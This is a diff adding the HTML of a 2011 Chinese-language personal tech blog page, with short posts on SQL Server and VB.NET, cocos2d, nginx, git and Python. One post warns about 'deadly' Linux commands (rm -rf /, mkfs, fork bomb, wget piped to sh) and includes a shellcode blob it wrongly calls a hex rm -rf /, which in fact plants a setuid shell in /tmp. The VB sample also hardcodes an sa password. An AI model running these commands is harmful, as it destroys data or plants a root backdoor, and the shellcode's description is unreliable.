@@ -1,0 +1,830 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>dawncold's tech blog</title>
+  <meta name="author" content="dawncold">
+
+  
+  <meta name="description" content="&lt;p&gt;并不想批评微软的产品，因为如果你用得习惯了，什么工具都不再是困难的。以前从没用过SQLSERVER，只是一直在用MySQL，用phpmyadmin管理起来也很方便。&lt;/p&gt; 昨晚下载了SQL SERVER 2008 R2 Express，才64MB， &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.youth2009.org/blog/page/15">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="dawncold's tech blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-8650400-5']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">dawncold's tech blog</a></h1>
+  
+    <h2>dawncold's tech blog</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.youth2009.org" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  	<li><a href="/">Blog</a></li>
+  	<li><a href="/blog/archives">Archives</a></li>
+	<li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/16/sql-server-is-so-bad/">SQL SERVER真差劲！</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-16T06:13:00+08:00" pubdate data-updated="true">Jul 16<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;并不想批评微软的产品，因为如果你用得习惯了，什么工具都不再是困难的。以前从没用过SQLSERVER，只是一直在用MySQL，用phpmyadmin管理起来也很方便。&lt;/p&gt;
+</code></pre>
+
+<p>昨晚下载了SQL SERVER 2008 R2 Express，才64MB，又下载了对应的Management Studio，竟然需要270MB！后者安装很不容易，我的硬盘又很小，安装过程中由于失误的操作，复制了一个SQL实例出来，原本就一个叫SQLEXPRESS，现在多了一个MSSQLEXPRESS，本来就很小的空间又一次被减小了，而且还没装上Management！最后磁盘空间实在不够了，我关闭了win7的系统分页文件，一下子出来2.6GB，幸亏内存够大。</p>
+
+
+<p>安装完毕后，两个实例都在运行，首先关闭一个。然后配置另一个的TCP/IP协议，这样才能正常连接。这里需要说明一下，在【SQL网络配额协议】中的【实例名下】的【TCP/IP】地址，最后一个是IPALL，写上TCP端口：1433，保存。重启实例的服务就能用management连接上了。</p>
+
+
+<p>在vb中的一个测试代码：（数据库Test，dbo.Member表中有一行数据，tianzhen\tz_pwd）</p>
+
+
+<p>最可恶的是我在设计表的时候用了nchar类型，长度用了10，如果字段内容不足10就会加空格补全。所以在vb中对于要和数据库中对比的时候必须把从数据库中得到的数据trim一下。</p>
+
+
+<br /><pre class="prettyprint linenums bush:vb" lang="vb">Imports System.Configuration
+
+
+<p>Imports System.Data.SqlClient</p>
+
+<p>Public Class Form1</p>
+
+<pre><code>Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+    Dim connStr As String = "Data Source = localhost; Initial Catalog = Test; user id = sa; password = tianzhen;"
+    Dim conn As SqlConnection = New SqlConnection(connStr)
+    Dim cmd As SqlCommand = New SqlCommand()
+    cmd.Connection = conn
+    cmd.CommandText = "SELECT password FROM dbo.Member WHERE username = 'tianzhen'"
+    Dim reader As SqlDataReader
+    conn.Open()
+    reader = cmd.ExecuteReader()
+    Dim login As Boolean = False
+    If reader.Read() Then
+        If TextBox1.Text = Trim(reader("password")) Then
+            MsgBox("login successfully!")
+        Else
+            MsgBox("login fail!!!")
+        End If
+    End If
+    conn.Close()
+End Sub
+</code></pre>
+
+<p>End Class
+</pre></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/15/install-cocos2d/">安装cocos2d 1.0</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-15T20:19:00+08:00" pubdate data-updated="true">Jul 15<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;前天cocos2d更新到了1.0版本，这个版本对于开源软件来说是一个里程碑，因为这应该是第一个能够称得上稳定的版本，当然也是新阶段的开始。&lt;/p&gt;
+</code></pre>
+
+<p>安装还是很简单的，我已经安装上了xcode4.0和sdk4.3。</p>
+
+
+<p>要注意一点的就是安装的时候需要root权限，用sudo即可。</p>
+
+
+<br /><pre class="prettyprint linenums bush:bash" lang="bash">dawncold@tianzhenmatoMacBook-Pro cocos2d-iphone-1.0.0$ sh ./install-templates.sh 
+
+
+<p>cocos2d-iphone template installer</p>
+
+<p>Error: This script must be run as root in order to copy templates to /Library/Application Support/Developer/Shared/Xcode</p>
+
+<p>Try running it with 'sudo', or with '-u' to install it only you:
+   sudo ./install-templates.sh
+or:
+   ./install-templates.sh -u
+dawncold@tianzhenmatoMacBook-Pro cocos2d-iphone-1.0.0$ sudo sh ./install-templates.sh
+Password:
+cocos2d-iphone template installer</p>
+
+<h2>Installing Xcode 4 cocos2d iOS template</h2>
+
+<p>...creating destination directory: /Users/dawncold/Library/Developer/Xcode/Templates/cocos2d/
+...copying cocos2d files
+...copying cocoslive files
+...copying TouchJSON files
+...copying CocosDenshion files
+...copying CocosDenshionExtras files
+...copying FontLabel files
+...copying template files
+done!</p>
+
+<h2>Installing Xcode 4 Chipmunk iOS template</h2>
+
+<p>...copying Chipmunk files
+done!</p>
+
+<h2>Installing Xcode 4 Box2d iOS template</h2>
+
+<p>...copying Box2d files
+done!</p>
+
+<h2>Installing Xcode 4 CCNode file templates...</h2>
+
+<p>...creating destination directory: /Users/dawncold/Library/Developer/Xcode/Templates/File Templates/cocos2d/
+done!
+...creating cocos2d template directory</p>
+
+<h2>Installing Xcode 3 cocos2d iOS template</h2>
+
+<p>...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Application/
+...copying template files
+...copying cocos2d files
+...copying cocos2d dependency files
+...copying CocosDenshion files
+...copying cocoslive files
+...copying cocoslive dependency files
+done!</p>
+
+<h2>Installing Xcode 3 cocos2d iOS + box2d template</h2>
+
+<p>...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Box2d Application/
+...copying template files
+...copying cocos2d files
+...copying cocos2d dependency files
+...copying CocosDenshion files
+...copying cocoslive files
+...copying cocoslive dependency files
+...copying Box2D files
+done!</p>
+
+<h2>Installing Xcode 3 cocos2d iOS + chipmunk template</h2>
+
+<p>...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Chipmunk Application/
+...copying template files
+...copying cocos2d files
+...copying cocos2d dependency files
+...copying CocosDenshion files
+...copying cocoslive files
+...copying cocoslive dependency files
+...copying Chipmunk files
+done!</p>
+
+<h2>Installing Xcode 3 cocos2d Mac template</h2>
+
+<p>...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Application - Mac/
+...copying template files
+...copying cocos2d files
+...copying CocosDenshion files
+done!
+...copying file templates
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/File Templates/cocos2d 1.0.0/</p>
+
+<h2>Installing Xcode 3 CCNode file templates...</h2>
+
+<p>done!
+</pre></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/14/vb-net-programming-problems/">VB.net考试上机题目汇总</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-14T18:17:00+08:00" pubdate data-updated="true">Jul 14<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;只是更新一下代码，因为在mac中的mono工作得不太好！！&lt;/p&gt;
+</code></pre>
+
+<p>1.求两个数的最大公约数和最小公倍数：</p>
+
+
+<br /><pre class="prettyprint linenums bush:vb" lang="vb">Module Module1
+
+
+<pre><code>Public Function Gcd(ByVal num1 As Integer, ByVal num2 As Integer) As Integer
+    If num2 = 0 Then
+        Return num1
+    Else
+        Return Gcd(num2, num1 Mod num2)
+    End If
+End Function
+
+Public Sub Main()
+    Console.WriteLine("Input first num: ")
+    Dim num1 As Integer = Convert.ToInt32(Console.ReadLine())
+    Console.WriteLine("Input second num: ")
+    Dim num2 As Integer = Convert.ToInt32(Console.ReadLine())
+    Console.WriteLine("Gcd is :{0}", Gcd(num1, num2))
+    Console.WriteLine("Lcd is :{0}", (num1 * num2) / Gcd(num1, num2)) '两个数的积除以最大公约数就是最小公倍数
+    Console.ReadLine()
+End Sub
+</code></pre>
+
+<p>End Module
+</pre></p>
+
+<br /><p></div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/blog/2011/07/14/vb-net-programming-problems/">Read on &rarr;</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/12/respect-your-limits/">尊重极限</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-12T22:07:00+08:00" pubdate data-updated="true">Jul 12<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;尊重极限，如同尊重自己。&lt;/p&gt;
+</code></pre>
+
+<p>刚刚从<a href="http://www.psychologies.com.cn/life/investigation/limits">这里</a>看到，尊重极限吧！</p>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/12/7-deadly-command-on-linux/">看来的7条致命Linux命令</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-12T18:11:00+08:00" pubdate data-updated="true">Jul 12<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;pre class="prettyprint linenums bush:bash" lang="bash"&gt;1. rm -rf / 此命令将递归并强制删除 / 目录下的所有文件。
+</code></pre>
+
+<ol>
+<li></li>
+</ol>
+
+
+<p>char esp[] <strong>attribute</strong> ((section(“.text”))) /<em> e.s.p
+release </em>/
+= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
+“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
+“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
+“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
+“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
+“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
+“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
+“cp -p /bin/sh /tmp/.beyond; chmod 4755
+/tmp/.beyond;”;</p>
+
+<p>这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。
+3. mkfs.ext3 /dev/sda 这将对硬盘进行重新格式化，自然，硬盘上的所有数据将灰飞烟灭。
+4. : ( ){  : |:&amp; };: 著名的 fork bomp，此命令将告诉你的系统执行海量的进程，直到你的系统僵死。
+5. any_command &gt; /dev/sda 使用该命令，原始数据将被写到块设备，其结果是造成数据丢失。
+6. wget http://some_untrusted_source -O- | sh 不要从不信任的地方下载东西，这可能会获取恶意代码。
+7. mv /home/yourhomedirectory/* /dev/null 此命令将移动主目录中的所有文件到一个不存在的地方，你将再也看不到那些文件。</pre></p>
+
+<br /><p>我在Mac系统下试用了第四条奇怪的明令，没什么效果，看来Mac还稍微安全一点。其他的就不试了……</p>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/10/nginx-location-config/">Nginx下的location配置</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-10T20:15:00+08:00" pubdate data-updated="true">Jul 10<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;原来的location只是处理了“/”的情况，结果访问一个目录，即使此目录下有index.html也不会成功显示，于是改成了这样：&lt;/p&gt;
+</code></pre>
+
+<br /><pre class="prettyprint linenums bush:bash" lang="bash">location ~.*\.(php|php5)?$
+
+
+<p>{</p>
+
+<pre><code> 处理php
+</code></pre>
+
+<p>}</pre></p>
+
+<br /><p>这样之后，发现直接访问目录或者域名的时候不能正常显示了，必须跟上index.php这样的才可以。</p>
+
+
+<p>最终改成这样，解决了问题：</p>
+
+
+<br /><pre class="prettyprint linenums bush:bash" lang="bash">location / {
+
+
+<pre><code>            root html;
+            index index.html index.php;
+</code></pre>
+
+<p>}
+location ~.*.(php|php5)?$ {
+处理php
+}</pre></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/10/git-export-function/">Git的导出功能</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-10T08:13:00+08:00" pubdate data-updated="true">Jul 10<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;用git管理项目的优势大家可能都看了许久了，我也是因为如此才用了git而不是svn、cvs这些。其实我是挺喜欢喜新厌旧的，因为新东西的出现并流行一定是比原来的有所突破，并且大多数人喜欢这种变革，所以为何不喜欢呢？&lt;/p&gt;
+</code></pre>
+
+<p>用git管理项目不可避免要遇到导出功能，在svn和cvs上应该叫export功能，git上的这个功能似乎没找到，要这样做：先打包，再解压到一个地方去。还能接受吧。</p>
+
+
+<br /><pre class="prettyprint linenums bush:bash" lang="bash">git-archive --prefix=map/ master | tar -x -C ../map_e/</pre>
+
+
+<br /><p>稍微解释一下，prefix指明了用哪个仓库，后面的master应该就是branch的名称了，然后把这些传递给了tar，因为不指明&#8211;format的时候默认用了tar方式打包，所以这里传递给tar解压到上层目录的map_e中，当然实际工作可以解压到生产服务器上去。</p>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/09/best-content-in-include_path/">最好在include_path中加上根</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-09T16:54:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;刚刚用了下typecho博客插件——友情链接来添加一个友情链接，但发现很多php文件找不到了，很奇怪，以前是可以的，看到warning中的信息，有个include_path的相关东西，看看里面提到的路径是不是有需要的文件，结果没有，而在其中路径的下一级目录下有，这就怪了。&lt;/p&gt;
+</code></pre>
+
+<p>Google说最好把include_path写成&#8221;./&#8221;。是不是这样就是自动便利所有的内容了？我猜是的！当前的include_path中又pear的路径，我就先不删除了，linux系统下用冒号分隔各个路径，在前面加上一个点即可。</p>
+
+
+<p>重启php，再次访问，恢复正常！</p>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/09/seek-and-tell-in-python/">简要写写python的file中的tell和seek</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-09T15:12:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;对于一个&lt;a title="file" href="http://www.youth2009.org/tag/file/"&gt;file&lt;/a&gt;，调用&lt;a title="tell" href="http://www.youth2009.org/tag/tell/"&gt;tell&lt;/a&gt;能够知道现在的文件位置。&lt;a title="seek" href="http://www.youth2009.org/tag/seek/"&gt;seek&lt;/a&gt;是改变文件位置。  比如文件中有3行句子，readline后位置就到了第一行的最后，再readline就到了第二行的最后，readline后我调用了tell，看到的结果就是这样的。输出完&lt;a title="tell" href="http://www.youth2009.org/tag/tell/"&gt;tell&lt;/a&gt;我又使用了&lt;a title="seek" href="http://www.youth2009.org/tag/seek/"&gt;seek&lt;/a&gt;(0),这样文件位置就回到开头了，下次再调用readline就会输出原来第一行的内容了，这应该是很容易理解的。不明白可以亲自试试。&lt;/p&gt;
+</code></pre>
+
+<p></p>
+
+
+<pre class="prettyprint linenums bush:python" lang="python">from sys import argv
+
+script, input_file = argv
+
+def print_all(f):
+    print f.read()
+
+def rewind(f):
+    f.seek(0)
+
+def print_a_line(line_count, f):
+    print line_count, f.readline()
+
+current_file = open(input_file)
+
+print "First let's print the while file:\n"
+print_all(current_file)
+
+print "Now let's rewind, kind of like a tape."
+rewind(current_file)
+
+print "Let's print three lines:"
+
+current_line = 1
+print_a_line(current_line, current_file)
+print "current_pos:%d" % current_file.tell()
+rewind(current_file)
+
+current_line += 1
+print_a_line(current_line, current_file)
+print "current_pos:%d" % current_file.tell()
+
+current_line += 1
+print_a_line(current_line, current_file)
+print "current_pos:%d" % current_file.tell()
+</pre>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/09/python-one-star-and-two-star/">Python中的*和**</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-09T14:44:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;在&lt;a title="python" href="http://www.youth2009.org/tag/python/"&gt;python&lt;/a&gt;的函数参数中，可以在变量名称前面加一个或者两个星号代表不一样的变量类型：&lt;/p&gt;
+</code></pre>
+
+<p>在stack overflow上看到有人问这两个的区别了，就转载过来答案吧：</p>
+
+
+<blockquote>If the form *identifier is present, it is initialized to a tuple receiving any excess positional parameters, defaulting to the empty tuple. If the form **identifier is present, it is initialized to a new dictionary receiving any excess keyword arguments, defaulting to a new empty dictionary.</blockquote>
+
+
+<p><span style="font-family: Arial, 'Liberation Sans', 'DejaVu Sans', sans-serif;"><span style="border-collapse: collapse;">加一个星号代表这个参数是一个tuple类型；加两个则是一个dictionary类型，很好用。</span></span></p>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/blog/page/16/">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/blog/page/14/">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    Included file &#8216;custom/asides/category_list.html&#8217; not found in _includes directory<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2013/03/13/generator-in-python/">generator-in-python</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/02/20/set-different-password-for-amazon-account/">set different password for amazon account</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/01/27/give-up-ruby/">give up ruby</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/01/22/config-dnsmasq-on-macos/">在MacOS上配置dnsmasq</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/01/20/merge-partition-got-couldnt-modify-partition-map-because-file-system-verification-failed-error/">merge partition got Couldn’t modify partition map because file system verification failed error</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - dawncold -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'dawncoldtechblog';
+      
+        
+        var disqus_script = 'count.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
